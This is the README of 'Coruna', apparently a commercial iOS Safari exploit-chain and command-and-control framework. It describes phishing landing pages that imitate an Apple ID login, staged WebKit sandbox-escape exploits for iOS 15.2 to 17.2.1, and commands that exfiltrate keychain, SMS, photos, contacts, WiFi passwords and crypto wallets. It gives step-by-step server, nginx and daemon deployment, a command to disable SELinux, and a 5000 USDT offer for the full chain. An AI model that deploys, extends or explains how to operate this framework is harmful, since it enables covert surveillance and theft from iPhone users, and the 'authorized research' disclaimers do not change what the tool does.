- The **full project** (including iOS 16.2 / 16.6 / 17.x adapted Stage1 WASM exploit, Stage3 native bridge, powerd injection dylib) is **not provided for free**.
- For fast research support, version adaptation, custom payload compilation, or binary exploit chain completion, contact:

| Contact | Address |
|---|---|
| **Telegram** | [https://t.me/Jeequan](https://t.me/Jeequan) |

- **Technical support pricing: 5000 USDT** one-time fee, includes one full exploit chain integration and one iOS version adaptation.
- Only accepts **legally authorized research** inquiries. **No attack commissions against real victims will be accepted.**

---

## 📋 Project Overview

Coruna is an end-to-end C2 framework for iOS Safari sandbox escape and post-exploitation research, consisting of three independent yet cooperating services:

| Port | Service | Entry File | Purpose |
|---|---|---|---|
| **5173** | Frontend Vue dev server | `veu/package.json` `scripts.dev` | Local development (HMR) |
| **7000** | Backend Admin API (FastAPI) | `server/admin/main.py` | Admin login / command dispatch / devices / audit / stats |
| **7070** | Exploit delivery + C2 landing | `server/exploit_server.py` | Phishing/exploit entry for iOS Safari: `/ch/<slug>`, `/group.html`, `/cmd` polling |

### Architecture Overview

```
d:\wwwroot\coruna\
├─ server/                          Backend: FastAPI + SQLAlchemy + SQLite
│   ├─ admin/                       FastAPI app entry + routers + ORM + config
│   │   ├─ main.py                  Entry (frontend hosting / SSE / security headers middleware)
│   │   ├─ auth.py                  JWT + 2FA authentication
│   │   ├─ agent_auth.py            Agent role (reseller account) separate auth
│   │   ├─ database.py              SQLAlchemy ORM + normalize_device_uuid
│   │   ├─ schemas.py               Pydantic models
│   │   ├─ config.py                .env loader + SECRET_KEY validation
│   │   ├─ config_constants.py      Single source of truth for all tunable thresholds
│   │   ├─ settings_manager.py      settings table read/write
│   │   ├─ limiter.py               slowapi rate limiter
│   │   ├─ wallet_parser.py         Wallet data parser
│   │   ├─ .env / .env.sample       Backend core config (key/CORS/rate-limit, must change in prod)
│   │   └─ routers/
│   │       ├─ *.py                 Admin routers (16: devices/commands/exfil/...)
│   │       ├─ agent/               Agent router subpackage (8)
│   │       ├─ _helpers.py          Shared helpers
│   │       └─ _rotate_logs.py      Log archive daemon
│   ├─ exploit_server.py            Port 7070: exploit delivery + C2 phishing landing
│   ├─ platform_module.js           WebKit PAC bypass + memory read/write primitives
│   ├─ utility_module.js            Utility module
│   ├─ group.html                   Main exploit entry (document.URL spoofing to prevent OOB)
│   ├─ Stage1_*.js                  iOS version-specific Stage1 WASM exploit (4 versions)
│   │   ├─ Stage1_15.2_15.5_jacurutu.js       iOS 15.2 - 15.5
│   │   ├─ Stage1_15.6_16.1.2_bluebird.js      iOS 15.6 - 16.1.2
│   │   ├─ Stage1_16.2_16.5.1_terrorbird.js    iOS 16.2 - 16.5.1
│   │   └─ Stage1_16.6_17.2.1_cassowary.js     iOS 16.6 - 17.2.1
│   ├─ Stage2_*.js                  Stage2 chain builders (5 versions)
│   │   ├─ Stage2_15.0_16.2_breezy15.js
│   │   ├─ Stage2_16.3_16.5.1_seedbell.js
│   │   ├─ Stage2_16.6_16.7.12_seedbell.js
│   │   ├─ Stage2_16.6_17.2.1_seedbell_pre.js
│   │   └─ Stage2_17.0_17.2.1_seedbell.js
│   ├─ Stage3_VariantA.js           Sandbox escape - Variant A
│   ├─ Stage3_VariantB.js           Sandbox escape - Variant B (primary)
│   ├─ payloads/
│   │   ├─ post_exploit.js          Post-exploitation command execution + C2 polling
│   │   ├─ manifest.json            Encrypted payload manifest (19 flags)
│   │   ├─ bootstrap.dylib          Bootstrap dylib
│   │   └─ <hash>/                 Module-hash organized encrypted payloads (dylib + bin)
│   ├─ templates/                   Phishing HTML templates (index.html / frame.html)
│   ├─ requirements.txt             Python dependencies
│   ├─ darksword.db                 SQLite database (auto-generated, do not commit)
│   ├─ logs/                        Runtime logs (auto-generated, includes devices/YYYYMMDD/UUID.log)
│   ├─ logs_archive/                Archived logs (auto-generated)
│   ├─ exfil/                       Exfiltrated data drop directory (runtime, do not commit)
│   └─ frontend/dist/               Frontend build output (backend can host, runtime-generated)
│
├─ veu/                             Frontend: Vue 3 + Element Plus + Vite + ECharts
│   ├─ src/
│   │   ├─ views/                   Pages (Dashboard / Devices / DeviceDetail / Commands / Exfil / Channels / Templates / Agents / Users / AuditLog / Settings / Login / Profile / Logs / Notifications / Scripts / FileBrowser / Wallets / Keychain / Contacts / SMS / Calls / WiFi / Photos)
│   │   ├─ stores/                  Pinia state
│   │   ├─ router/                  Vue Router (history mode)
│   │   ├─ utils/
│   │   │   ├─ axios.js             Request wrapper (baseURL empty, proxy-friendly)
│   │   │   └─ twofa.js             2FA utilities
│   │   └─ constants/               Frontend constants
│   ├─ vite.config.js               Vite config (proxy reverse proxy / SSE handling)
│   ├─ index.html
│   └─ package.json                 Frontend deps & dev/build/preview scripts
│
├─ 完整部署教程_后端启动+前端启动+打包+宝塔面板.md  (Chinese deployment guide)
├─ iOS 完整利用 + C2 执行流程（10 步端到端）.md       (Chinese 10-step iOS flow)
└─ README.md                       This file
```

---

## 🎯 Features

### Admin Dashboard (Vue Frontend)

- **Dashboard**: 16 stat cards + 6 charts (device status / command status / top models / top channels / exfil distribution / 7-day trend)
- **Device Management**: list, detail, heartbeat timeline, exploit progress bar (7-stage visualization), access log terminal
- **Command Execution**: command history, status filtering, manual retry, quick templates, batch execution
- **Data Exfiltration**: sandbox / keychain / WiFi / contacts / SMS / calls / photos / files / wallet categorized preview & download
- **Channel Management**: phishing landing config, domain whitelist, template binding
- **Template Management**: editable HTML templates (e.g., fake Apple ID login)
- **Audit Log**: login / command / data operation full audit

### C2 Backend (FastAPI 7000)

- JWT auth + 2FA support + rate limiting
- 8 modules: devices / commands / exfil / channels / templates / agents / users / audit
- SSE real-time notification stream (device online, command execution, data return)
- Single-port frontend hosting after build (no separate Nginx needed)

### Exploit Service (7070)

- Channel phishing landing: `/ch/<slug>?tpl=<tpl>`
- Device registration: 3-tier UUID resolution (query → cookie → referer) + 40+ crawler UA blocking
- C2 command dispatch: 5-step state machine (fake completed reset → stale reset → Safari prefix filter → deferred backoff → concurrency guard)
- Result writeback: `/cmd_result` + exfil persistence (34 prefixes → 9 categories → auto file extension)
- Async reporting: 3 daemon threads → 7000 (device register / exploit report / device data)

---

## 🚀 Quick Start

### Requirements

| Software | Min Version | Recommended |
|---|---|---|
| Python | 3.10 | 3.11 / 3.12 |
| Node.js | 18 | 20 LTS |
| npm | 9 | 10+ |

### 1. Start Backend (Port 7000)

```bash
# ① Enter backend directory (must run from server/ or admin.* import fails)
cd d:\wwwroot\coruna\server          # Windows
# cd /www/wwwroot/coruna/server      # Linux

# ② Install dependencies
python -m pip install -r requirements.txt
# CN mirror: -i https://pypi.tuna.tsinghua.edu.cn/simple

# ③ Start (dev mode)
python -m uvicorn admin.main:app --host 0.0.0.0 --port 7000 --reload
```

Success indicators:
```
INFO:     Application startup complete.
INFO:     Uvicorn running on http://0.0.0.0:7000
```

- Default admin: `admin` / `admin123` (**must change in production**)
- Swagger docs: http://127.0.0.1:7000/docs

### 2. Start Frontend (Port 5173, local dev only)

```bash
cd d:\wwwroot\coruna\veu
npm install --no-audit --no-fund
npm run dev
```

Open http://localhost:5173/ to login. Vite proxy is preconfigured (`/api → 7000`, `/ch/* → 7070`), no baseURL change needed.

### 3. Start exploit_server (Port 7070)

```bash
cd d:\wwwroot\coruna\server
python exploit_server.py --port 7070
```

Verification:
| URL | Expected |
|---|---|
| http://127.0.0.1:7070/group.html | HTML response (HTTP 200) |
| http://127.0.0.1:7070/ch/demomobanb?ch=demomobanb&tpl=appleid-login | Phishing landing page |

### One-Click Local Start (3 terminals)

```powershell
# Terminal 1: Backend 7000
cd d:\wwwroot\coruna\server ; python -m uvicorn admin.main:app --host 0.0.0.0 --port 7000 --reload

# Terminal 2: Frontend 5173
cd d:\wwwroot\coruna\veu ; npm run dev

# Terminal 3: Exploit 7070
cd d:\wwwroot\coruna\server ; python exploit_server.py --port 7070
```

---

## 📦 Production Deployment (BT Panel / aaPanel on Linux)

### 1. Modify Production Config (**Required**)

Edit `/www/wwwroot/coruna/server/admin/.env`:

```dotenv
# ① Generate new SECRET_KEY
# Command: python -c "import secrets; print(secrets.token_urlsafe(64))"
SECRET_KEY=replace_with_64_char_random_string

# ② CORS_ORIGINS: add your domains
CORS_ORIGINS=https://admin.yourdomain.com,https://ch.yourdomain.com,http://127.0.0.1:7000

# ③ DARKSWORD_PUBLIC_BASE: public 7070 access URL
DARKSWORD_PUBLIC_BASE=http://your-server-public-ip:7070
```

### 2. Install Backend Dependencies + Init DB

```bash
cd /www/wwwroot/coruna/server
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

### 3. Deploy Backend via BT "Python Project Manager" (Port 7000)

| Field | Value |
|---|---|
| Project Name | `coruna_admin` |
| Path | `/www/wwwroot/coruna/server` |
| Python Version | 3.11 / 3.12 |
| Framework | `uvicorn` |
| Startup Mode | `Module` |
| Module Name | `admin.main:app` |
| Run Args | `--host 0.0.0.0 --port 7000 --workers 4 --timeout-keep-alive 75` |
| Install Dependencies | ✅ checked |

### 4. Build Frontend and Deploy to Backend Hosting

```bash
cd /www/wwwroot/coruna/veu
npm install --no-audit --no-fund
npm run build
rm -rf /www/wwwroot/coruna/server/frontend
mkdir -p /www/wwwroot/coruna/server/frontend
cp -rf /www/wwwroot/coruna/veu/dist /www/wwwroot/coruna/server/frontend/
```

Verify: `curl -sS http://127.0.0.1:7000/ | head -5` should show `<!doctype html>`.

### 5. Supervisor Daemon for exploit_server (Port 7070)

BT Panel → Software Store → **Supervisor Manager** → Add daemon:

| Field | Value |
|---|---|
| Name | `coruna_exploit` |
| User | `root` |
| Working Dir | `/www/wwwroot/coruna/server` |
| Command | `/www/wwwroot/coruna/server/venv/bin/python exploit_server.py --port 7070` |
| Log File | `/www/wwwroot/coruna/server/logs/exploit_server.log` |

### 6. Nginx Reverse Proxy Config

**Admin domain** (admin.yourdomain.com → 7000):

```nginx
server {
    listen 80;
    listen 443 ssl http2;
    server_name admin.yourdomain.com;
    ssl_certificate     /www/server/panel/vhost/cert/admin.yourdomain.com/fullchain.pem;
    ssl_certificate_key /www/server/panel/vhost/cert/admin.yourdomain.com/privkey.pem;

    client_max_body_size 200M;

    map $http_upgrade $connection_upgrade {
        default upgrade;
        '' close;
    }

    location / {
        proxy_pass http://127.0.0.1:7000;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection $connection_upgrade;
        proxy_buffering off;
        proxy_read_timeout 86400s;
        proxy_send_timeout 86400s;
    }

    # 7070 exploit service via same-domain /ch-path
    location ~ ^/(ch|if|t|sdk|group|stage|report|payloads|cmd|cmd_result|cmd_push|upload)/ {
        proxy_pass http://127.0.0.1:7070;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_read_timeout 300s;
    }
}
```

**Channel domain** (ch.yourdomain.com → 7070, optional):

```nginx
server {
    listen 80;
    listen 443 ssl http2;
    server_name ch.yourdomain.com;
    ssl_certificate     /www/server/panel/vhost/cert/ch.yourdomain.com/fullchain.pem;
    ssl_certificate_key /www/server/panel/vhost/cert/ch.yourdomain.com/privkey.pem;

    client_max_body_size 200M;

    location / {
        proxy_pass http://127.0.0.1:7070;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_read_timeout 300s;
        add_header Cache-Control "no-store, no-cache";
    }
}
```

After changes: `nginx -t && nginx -s reload`

### 7. Deployment Verification Checklist

| # | Check | Pass Criteria |
|---|---|---|
| 1 | Visit `https://admin.yourdomain.com/` | Login page, valid cert |
| 2 | Login with `admin` + new password | Redirects to Dashboard, no 401/403 |
| 3 | F12 → Network → `stream` | Status 200, persistent Pending |
| 4 | Dashboard loads | 8 cards + charts with data |
| 5 | Channel list opens | List visible |
| 6 | Public channel URL | `https://ch.yourdomain.com/ch/demomobanb?ch=demomobanb&tpl=appleid-login` shows fake Apple page |
| 7 | Command dispatch | Device → send `ds_info` → enters pending list |
| 8 | Server restart | Nginx / Python / exploit_server auto-start |

---

## 🔬 iOS Exploit + C2 Execution Flow (10 Steps End-to-End)

```
User iPhone Safari visits URL
        │
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 1  Phishing Landing: /ch/<slug>?tpl=<tpl>    exploit 7070    │
 │         Channel/template/domain security check → register device  │
 │         → 302 redirect to /group.html                            │
 └──────────────────────────────────────────────────────────────────┘
        │  HTTP 302 (Cookie sets ds_uuid/ds_chid/ds_tpid)
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 2  group.html main exploit entry                            │
 │         Object.defineProperty fakes document.URL=origin/group.html
 │         Restores ds_uuid from cookie / localStorage              │
 │         Loads platform_module.js + utility_module.js             │
 └──────────────────────────────────────────────────────────────────┘
        │  <script src="/platform_module.js">
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 3  platform_module: WebKit PAC bypass + memory primitives   │
 │         exploitPrimitive: addrof() / readRawBigInt() / read32()  │
 │         struct offsets config + 0xFEEDFACF Mach-O scan            │
 └──────────────────────────────────────────────────────────────────┘
        │  exploitPrimitive initialized → can read/write Safari memory
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 4  Stage decryption container                               │
 │         (ChaCha20+F00DBEEF+LZMA+19 manifest flags)               │
 │         Two hash module IDs decrypt → Stage3 injected             │
 │         Provides native call bridge window.c + file.* primitives │
 └──────────────────────────────────────────────────────────────────┘
        │
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 5  Device registration + heartbeat: 7070 → DB → 7000 notify│
 │         _ensure_device_registered() → UA anti-crawler (40+ marks)│
 │         update_device_in_db() → notify_admin_register_async()     │
 └──────────────────────────────────────────────────────────────────┘
        │  Safari post_exploit.js polls GET /cmd every 3s
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 6  C2 command dispatch state machine: get_pending_commands()│
 │   0. Reset fake completed (empty/[SKIP]/<2 bytes/[DEFER] → pending)│
 │   1. Reset stale executing (A: 60s / B: 120s stuck → pending)    │
 │   2. UA identify Safari vs native: SAFE_SAFARI_PREFIXES 30+ filter│
 │   3. Deferred 30s backoff (avoid [DEFER-native] tight loop)     │
 │   4. MAX_CONCURRENT=1 concurrency guard                          │
 └──────────────────────────────────────────────────────────────────┘
        │  Returns JSON: [{id, command}]  or  204 No Content
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 7  post_exploit.js command execution                        │
 │   Safari immediate: ds_info / ds_alert / ds_location(web) / ui.* │
 │   Requires Stage3 native bridge: ds_exfil_* / ds_keychain /      │
 │                                  ds_photos / file.read / shell.* │
 │   Bridge unavailable: returns [DEFER-native][reason]             │
 └──────────────────────────────────────────────────────────────────┘
        │  After execution → POST /cmd_result {id, output, status}
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 8  Result writeback + exfil persistence: update_command_result()
 │   [DEFER-*] → status=deferred (30s backoff start point)         │
 │   Normal → status=completed + output to DB                       │
 │   _persist_cmd_output_as_exfil(): 34 prefixes → category mapping │
 │   → write server/exfil/ + ExfilData table → admin exfil download │
 └──────────────────────────────────────────────────────────────────┘
        │
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 9  Report/data return API bridge: 7070 → 7000 (3 threads)  │
 │   ① POST /stage & /report → forward_exploit_report_async         │
 │   ② POST /upload (device data blob) → forward_device_data_async  │
 │   ③ GET /?e=0 legacy → UA+IP 3600s window match recent device   │
 └──────────────────────────────────────────────────────────────────┘
        │
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 10 Admin dashboard closed loop: 7000 FastAPI → 5173 Vue     │
 │   Admin: add command/channel/template → darksword.db Command pending│
 │   ↕ Next Safari /cmd poll picks up → executes → /cmd_result      │
 │   Dashboard 16 cards + 6 charts real-time refresh                │
 └──────────────────────────────────────────────────────────────────┘
```

### C2 Command State Machine

```
User creates command → [pending]
   │  Safari polls GET /cmd → selected → DB changes to 'executing'
   ▼
[executing] ──┬─ POST /cmd_result status=completed,output=xxx → [completed] → exfil persist
              ├─ POST /cmd_result status=failed → [failed]
              ├─ POST /cmd_result status=error → [error]
              └─ POST /cmd_result output=[DEFER-*] → [deferred]
                                                  │ after 30s
                                                  ▼
                                              [retry → pending candidate]
```

### 4 Auto-Reset Paths

| Reset Type | Trigger Condition | Code Location |
|---|---|---|
| ① Fake completed | output empty/[SKIP]/[DEFER]/<2 chars | exploit_server.py:628-651 |
| ② Stale A | executing + never had executed_at + created_at > 60s | exploit_server.py:654-662 |
| ③ Stale B | executing + executed_at > 120s | exploit_server.py:663-669 |
| ④ Deferred retry | deferred + never executed OR executed_at >= 30s ago | exploit_server.py:685-705 |

---

## 📚 Supported iOS Versions

| Stage1 Module | Supported iOS Range | Status |
|---|---|---|
| `Stage1_15.2_15.5_jacurutu.js` | iOS 15.2 - 15.5 | ✅ Framework complete |
| `Stage1_15.6_16.1.2_bluebird.js` | iOS 15.6 - 16.1.2 | ✅ Framework complete |
| `Stage1_16.2_16.5.1_terrorbird.js` | iOS 16.2 - 16.5.1 | ✅ Framework complete (verified 16.2) |
| `Stage1_16.6_17.2.1_cassowary.js` | iOS 16.6 - 17.2.1 | ✅ Framework complete (verified 16.6.x) |

> ⚠️ Newer iOS versions (e.g., 16.7.11) may fail Stage1 WASM exploit due to Apple security patches. Latest version adaptation requires contacting the author for updated offset tables.

### Exploit Progress Visualization (Admin Device Detail Page)

Device detail page shows a complete 7-stage exploit progress bar:

| Stage | Progress | Trigger Condition |
|---|---|---|
| Device Online | 10% | `device.first_seen` exists |
| Exploit Page Visit | 20% | `device.host` / `access_path` / `referer` |
| Payload Load Execute | 35% | sandbox data / heartbeat source contains sandbox |
| Sandbox Escape (Stage3) | 55% | `exploit_status=success` / heartbeat contains exploit_report |
| Post-Exploit Running | 70% | heartbeat contains post_exploit / has commands |
| C2 Channel Established | 85% | `last_command_time` exists / command count > 0 |
| Data Exfiltration Return | 100% | exfil_data table has non-sandbox data |

---

## 🛠️ Command Reference

### Safari Immediate Execution (no Stage3 native bridge required)

| Command | Description |
|---|---|
| `ds_info` | Device basic info |
| `ds_status` | Device status |
| `ds_alert <msg>` | Alert popup |
| `ds_notify <msg>` | Notification |
| `ds_vibrate` | Vibration |
| `ds_location` | Web geolocation (requires HTTPS + user consent) |
| `ui.*` | UI series commands |

### Requires Stage3 Native Bridge

| Command | Description |
|---|---|
| `ds_exfil_keychain` | Exfiltrate Keychain |
| `ds_exfil_sms` | Exfiltrate SMS |
| `ds_exfil_photos` | Exfiltrate photos |
| `ds_exfil_contacts` | Exfiltrate contacts |
| `ds_exfil_calls` | Exfiltrate call history |
| `ds_exfil_wifi` | Exfiltrate WiFi passwords |
| `ds_exfil_wallet` | Exfiltrate wallet |
| `file.read` / `file.list` / `file.write` | File primitives |
| `shell.*` / `execShell` | Shell execution |
| `scanWallet` / `scanAllWallets` | Wallet scanning |
| `dumpKeychain` / `dumpMemory` | Memory/keychain dump |

> When native bridge is unavailable, all return `[DEFER-native][specific reason]`, with 30s backoff auto-retry by the state machine.

---

## ⚙️ Configuration & Customization

### Key Config Files

| File | Purpose | Must-Change Items |
|---|---|---|
| `server/admin/.env` | Backend key/CORS/rate-limit | `SECRET_KEY`, `CORS_ORIGINS`, `DARKSWORD_PUBLIC_BASE` |
| `server/exploit_server.py:23-25` | Backend API URL | `ADMIN_REGISTER_URL` / `ADMIN_REPORT_URL` |
| `veu/vite.config.js` | Frontend proxy | Dev only, production uses Nginx |

### Key Parameter Tuning

| What to change | Location |
|---|---|
| Command dispatch max concurrency | `exploit_server.py:777` `MAX_CONCURRENT` |
| Stale command reset time | `exploit_server.py:654` / `667` |
| Deferred retry backoff | `exploit_server.py:688` `min_defer_time` |
| Add new Safari command prefix | `exploit_server.py:727` `SAFE_SAFARI_PREFIXES` |
| Add new exfil category | `exploit_server.py:556` `_CMD_CATEGORY_MAP` + `584` `ext_map` |
| Exfil persistence directory | `exploit_server.py:595` `EXFIL_DIR.mkdir` |

---

## ❓ FAQ

<details>
<summary><b>Q1: Windows 'vite' is not recognized as an internal or external command</b></summary>

Cause: frontend dependencies not installed. Fix:
```bash
cd d:\wwwroot\coruna\veu
Remove-Item node_modules -Recurse -Force
npm install
npm run dev
```
</details>

<details>
<summary><b>Q2: Backend startup error "No module named 'admin'"</b></summary>

Cause: working directory is not `server/`. Fix:
```bash
cd server
python -m uvicorn admin.main:app --host 0.0.0.0 --port 7000
```
</details>

<details>
<summary><b>Q3: All frontend requests return 404</b></summary>

Cause: axios baseURL has duplicate prefix. `veu/src/utils/axios.js` baseURL must be empty string. Dev uses Vite proxy, production uses Nginx reverse proxy.
</details>

<details>
<summary><b>Q4: CORS errors</b></summary>

- Local dev: always open from 5173, Vite proxy is same-origin.
- Production: use single Nginx domain, no CORS issues.
- When adding new domains, update `CORS_ORIGINS` in `server/admin/.env`.
</details>

<details>
<summary><b>Q5: SQLite "database is locked"</b></summary>

- Production `--workers` should not exceed 2.
- Enable WAL mode:
```bash
sqlite3 /www/wwwroot/coruna/server/darksword.db "PRAGMA journal_mode=WAL; PRAGMA synchronous=NORMAL;"
```
- For >5000 devices/day, change `DATABASE_URL` to PostgreSQL.
</details>

<details>
<summary><b>Q6: exploit_server /ch/demomobanb returns 404</b></summary>

Channel `demomobanb` not created. Login admin → Channel Management → New:
- slug: `demomobanb`
- Default template: `Apple ID Login`
</details>

<details>
<summary><b>Q7: BT Nginx 502 Bad Gateway</b></summary>

- Backend uvicorn not running (Python Project Manager shows "stopped").
- Nginx proxy_pass port is wrong.
- CentOS SELinux not disabled:
```bash
setenforce 0
sed -i 's/^SELINUX=enforcing/SELINUX=disabled/' /etc/selinux/config
```
</details>

<details>
<summary><b>Q8: iOS 16.7.x Stage1 failure</b></summary>

Newer iOS versions (e.g., 16.7.11) may have Apple security patches that fix the WASM vulnerability or modify internal offsets. Requires:
1. Obtain specific 16.7.x WebKit JIT offsets
2. Add `{GFx77t: 160700, ...}` entry to `LTgSl5` array in `platform_module.js`
3. If vulnerability is patched, this version is unsupported

Contact the author for latest version adaptation support.
</details>

---

## 📁 Project Structure (Compact)

> Full structure: see "Architecture Overview" above. Only key nodes listed here.

```
coruna/
├─ server/                          # Backend
│   ├─ admin/                       # FastAPI app
│   │   ├─ main.py                  # Entry (frontend hosting / SSE / security headers)
│   │   ├─ auth.py / agent_auth.py  # Admin + Agent dual-track auth
│   │   ├─ database.py              # SQLAlchemy ORM + normalize_device_uuid
│   │   ├─ config.py / config_constants.py  # .env + single source of truth for thresholds
│   │   └─ routers/
│   │       ├─ *.py                  # Admin routers (16: devices/commands/exfil/channels/...)
│   │       └─ agent/               # Agent role router subpackage (8)
│   ├─ exploit_server.py            # Port 7070 exploit + C2
│   ├─ platform_module.js           # WebKit PAC bypass + primitives
│   ├─ utility_module.js            # Utility module
│   ├─ Stage1_*.js                  # 4 version Stage1 WASM exploits
│   ├─ Stage2_*.js                  # 5 version Stage2 chain builders
│   ├─ Stage3_VariantA.js / Stage3_VariantB.js   # Sandbox escape dual variants
│   ├─ group.html                   # Main exploit entry
│   ├─ payloads/
│   │   ├─ post_exploit.js          # Post-exploitation + C2 polling
│   │   ├─ manifest.json            # Encrypted payload manifest
│   │   ├─ bootstrap.dylib          # Bootstrap dylib
│   │   └─ <hash>/                  # Module-hash organized encrypted payloads
│   ├─ templates/                   # Phishing HTML templates
│   ├─ requirements.txt
│   ├─ darksword.db                 # SQLite database (auto-generated)
│   ├─ logs/ / logs_archive/        # Logs and archives (auto-generated)
│   └─ exfil/                       # Exfiltrated data drop (runtime-generated)
│
├─ veu/                             # Frontend
│   ├─ src/
│   │   ├─ views/                   # 25 pages (Dashboard/Devices/DeviceDetail/Commands/Exfil/...)
│   │   ├─ stores/                  # Pinia
│   │   ├─ router/                  # Vue Router
│   │   ├─ utils/axios.js + twofa.js
│   │   └─ constants/
│   ├─ vite.config.js               # Vite + proxy + SSE handling
│   └─ package.json
│
├─ 完整部署教程_后端启动+前端启动+打包+宝塔面板.md  (Chinese deployment guide)
├─ iOS 完整利用 + C2 执行流程（10 步端到端）.md       (Chinese 10-step iOS flow)
└─ README.md                        # This file
```

---

## 🔒 Security Recommendations

### Deployment Security

1. **Must change `SECRET_KEY` in production** (generate with `python -c "import secrets; print(secrets.token_urlsafe(64))"`).
2. **Change default admin password** (top-right profile after login).
3. **CORS_ORIGINS** should only list your own domains.
4. **Port 7070** in production should use Nginx HTTPS reverse proxy, not plaintext.
5. **Enable SQLite WAL mode** to avoid high-concurrency write locks.
6. **Regularly backup `darksword.db` and `exfil/` directory**.

### Defensive Usage

- Run only in authorized test environments
- Immediately clear `exfil/` directory and `darksword.db` after testing
- Do not run long-term on production servers
- Set `enabled=0` on channels no longer in use

---

## 📜 License & Disclaimer

This repository code is released under the **MIT** license, but:

- **Does NOT include** real exploitation binaries (powerd dylib / SpringBoardTweak / ChaCha20 Key / version offset table)
- **Does NOT provide** attack capability against real devices
- **Does NOT assume** any legal liability for improper use
- Downloading constitutes acceptance of this README's legal notice

The full exploit chain (with real payloads and version adaptation) requires contacting the author:

| Contact | Address | Price |
|---|---|---|
| **Telegram** | [https://t.me/Jeequan](https://t.me/Jeequan) | 5000 USDT |

---

## ⚠️ Final Warning

> **Delete within 24 hours after download.**
>
> This project is intended solely for authorized security research, CTF competitions, and educational demonstrations. Testing on any device without authorization is illegal. The author does not provide or sell any attack services against real victims.
>
> **Use legally. You are responsible for your actions.**

---

*Coruna — iOS Research Framework · 2026*
